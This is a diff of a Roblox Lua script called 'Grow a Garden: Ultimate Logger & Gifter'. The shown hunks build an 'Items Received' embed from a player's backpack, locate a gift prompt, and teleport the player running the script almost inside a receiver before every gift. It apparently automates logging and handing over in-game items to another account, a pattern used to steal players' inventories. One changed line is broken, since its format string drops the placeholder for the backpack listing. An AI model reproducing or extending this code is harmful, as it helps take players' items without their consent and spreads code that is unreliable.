@@ -1,4 +1,4 @@
-c-- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED)
+-- Grow a Garden: Ultimate Logger & Gifter (Backpack Code Block FINALLY FIXED)
 -- Made By Timoci | discord.gg/notyet
 
 local CONFIG = {
@@ -136,7 +136,7 @@ end
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
-description = string.format("```\n%s\n```", buildBackpackSection(items)),
+        description = string.format("``````", buildBackpackSection(items)),
         color = 5793266, -- blue-ish
     }
 end
@@ -261,19 +261,7 @@ local function findGiftPrompt(targetChar)
     return nil
 end
 
--- NEW: Move the receiver almost inside your character before gifting
-local function spawnPlayerNear(targetPlayer, playerToSpawn)
-    if targetPlayer and playerToSpawn and targetPlayer.Character and playerToSpawn.Character then
-        local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local spawnHRP = playerToSpawn.Character:FindFirstChild("HumanoidRootPart")
-        if targetHRP and spawnHRP then
-            -- Offset slightly to avoid exact overlap (0.3 studs in front)
-            local offset = Vector3.new(0, 0, 0.3)
-            spawnHRP.CFrame = targetHRP.CFrame * CFrame.new(offset)
-        end
-    end
-end
-
+-- TELEPORT EXECUTOR (YOU) ALMOST INSIDE RECEIVER BEFORE EVERY GIFT
 local function doGift(receiver)
     if giftingDone then return end
     giftingDone = true
